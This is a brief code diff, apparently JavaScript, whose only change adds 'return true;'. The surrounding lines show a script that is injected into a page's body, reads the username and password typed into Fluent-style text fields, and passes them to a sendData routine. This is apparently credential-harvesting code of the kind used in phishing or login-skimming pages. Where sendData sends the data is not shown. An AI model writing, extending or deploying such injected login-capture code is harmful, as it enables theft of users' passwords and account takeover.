@@ -30,6 +30,7 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                 }
+                return true;
             });
         `;
         doc.body.appendChild(script);
